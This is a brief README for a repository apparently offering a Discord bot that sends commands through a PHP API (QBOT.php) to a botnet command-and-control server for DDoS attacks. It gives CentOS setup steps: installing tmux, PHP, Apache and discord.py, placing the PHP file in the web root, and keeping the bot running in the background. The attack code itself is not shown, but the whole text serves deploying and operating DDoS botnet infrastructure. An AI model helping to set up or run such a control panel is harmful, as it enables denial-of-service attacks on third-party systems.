# DDoS-Bot-Python
Source code for a discord bot that can send commands to an API connected to your botnet C&amp;C


centOS Setup:

Install tmux:
yum install tmux -y

install PHP:
yum install php -y
yum install httpd -y

(Move QBOT.php to /var/www/html)
service httpd restart

PIP/discord.py
yum install epel-release
sudo yum install python-pip
sudo yum groupinstall 'development tools'

python3.6 -m pip install -U discord.py
(Run the bot)
python3 bot.py

(Run the bot while not using server)
tmux
python3 bot.py
[exit ssh client]

Reatach to tmux session:
tmux attach
